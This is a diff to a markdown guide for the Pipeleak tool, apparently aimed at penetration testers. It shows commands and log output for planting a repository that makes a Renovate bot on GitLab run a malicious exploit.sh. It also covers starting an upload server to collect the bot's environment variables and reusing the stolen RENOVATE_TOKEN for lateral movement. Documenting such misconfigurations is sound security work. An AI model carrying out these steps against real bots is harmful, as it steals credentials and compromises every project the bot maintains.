@@ -15,11 +15,11 @@ This guide explains how to use Pipeleak to discover and exploit common misconfig
 There are two key points to understand:
 
 1. **Code Execution by Renovated Repositories**
-> Every project renovated by the same bot must be considered equally trusted and exposed to the same attack level. If one project is compromised, all others processed by that bot can be affected. Code execution by the renovated repository in the bot context is assumed in Renovate's threat model.
+
+   > Every project renovated by the same bot must be considered equally trusted and exposed to the same attack level. If one project is compromised, all others processed by that bot can be affected. Code execution by the renovated repository in the bot context is assumed in Renovate's threat model.
 
 2. **GitLab Invite Auto-Acceptance**
-> GitLab project invites are auto-accepted. You can invite any bot directly to your repository. If it is then renovated by the invited bot, you can compromise the bot user.
-
+   > GitLab project invites are auto-accepted. You can invite any bot directly to your repository. If it is then renovated by the invited bot, you can compromise the bot user.
 
 ## 1. Enumerate Renovate Bot Usage
 
@@ -39,7 +39,6 @@ pipeleak gl renovate enum -g https://gitlab.com -t glpat-[redacted] --dump
 2025-09-30T07:11:16Z INF Done, Bye Bye 🏳️‍🌈🔥
 ```
 
-
 This makes the bot susceptible to autodiscovery exploits, since it will renovate any repository it can access.
 
 Even when autodiscovery filters are enabled, weak or poorly written filter regexes can still allow attackers to bypass them and exploit the bot.
@@ -51,16 +50,19 @@ Even when autodiscovery filters are enabled, weak or poorly written filter regex
 The Renovate bot from the example above is configured to autodiscover new projects and does not apply any, or only weak, bypassable filters. You can create a repository with a malicious script that gets executed by the bot.
 
 The following command creates a repository that includes an exploit script called `exploit.sh`. Whenever a Renovate bot picks up this repo, the script will be executed.
+
 ```bash
-pipeleak gl renovate autodiscovery -g https://gitlab.com -t glpat-[redacted] 
+pipeleak gl renovate autodiscovery -g https://gitlab.com -t glpat-[redacted] -v
 2025-09-30T07:19:33Z INF Created project name=devfe-pipeleak-renovate-autodiscovery-poc url=https://gitlab.com/myuser/devfe-pipeleak-renovate-autodiscovery-poc
-2025-09-30T07:19:35Z INF Created file file=renovate.json
-2025-09-30T07:19:35Z INF Created file file=package.json
-2025-09-30T07:19:36Z INF Created file file=package-lock.json
-2025-09-30T07:19:37Z INF Created file file=exploit.sh
-2025-09-30T07:19:37Z INF No username provided, you must invite the victim Renovate Bot user manually to the created project
+2025-09-30T07:19:35Z DBG Created file fileName=renovate.json
+2025-09-30T07:19:35Z DBG Created file fileName=build.gradle
+2025-09-30T07:19:36Z DBG Created file fileName=gradlew
+2025-09-30T07:19:36Z DBG Created file fileName=gradle/wrapper/gradle-wrapper.properties
+2025-09-30T07:19:37Z DBG Created file fileName=exploit.sh
+2025-09-30T07:19:37Z INF This exploit works by using an outdated Gradle wrapper version (7.0) that triggers Renovate to run './gradlew wrapper'
+2025-09-30T07:19:37Z INF When Renovate updates the wrapper, it executes our malicious gradlew script which runs exploit.sh
 2025-09-30T07:19:37Z INF Make sure to update the exploit.sh script with the actual exploit code
-2025-09-30T07:19:37Z INF Then wait until the created project is renovated by the invited by the Renovate Bot user
+2025-09-30T07:19:37Z INF Then wait until the created project is renovated by the invited Renovate Bot user
 ```
 
 First, set up the `exploit.sh` script according to your needs. The goal is to read the Renovate process environment variables and exfiltrate them to your attacker server.
@@ -90,11 +92,11 @@ fi
 ```
 
 On your attacker server, start a [GoShs](https://github.com/patrickhener/goshs) server to accept the environment files from the Renovate process.
+
 ```bash
 ./goshs --ssl --self-signed --upload-only -no-clipboard --no-delete --port 8000
 INFO   [2025-09-30 09:31:29] You are running the newest version (v1.1.1) of goshs
 ```
-
 
 Next, identify the bot user and invite it to your repository. By looking at the Renovate bot configuration, you can identify the renovated repos and check the username of the bot user in the merge requests created by that bot.
 
@@ -107,7 +109,6 @@ Invite that user to your repository with `developer` access. Now, wait until the
 In that file, extract all sensitive environment variables and use them for lateral movement. Most interesting is probably the `RENOVATE_TOKEN`, as it might contain a GitLab PAT. You can then enumerate the access of that PAT using Pipeleak's features.
 
 > After receiving a merge request from the Renovate bot, you must fully delete both the branch and the merge request. This ensures the bot will recreate them, allowing your script to run again. Otherwise, the script will not be executed a second time. Ensure to revert the commits as well if they were merged.
-
 
 ## 3. Privilege Escalation via Renovate Bot Branches
 
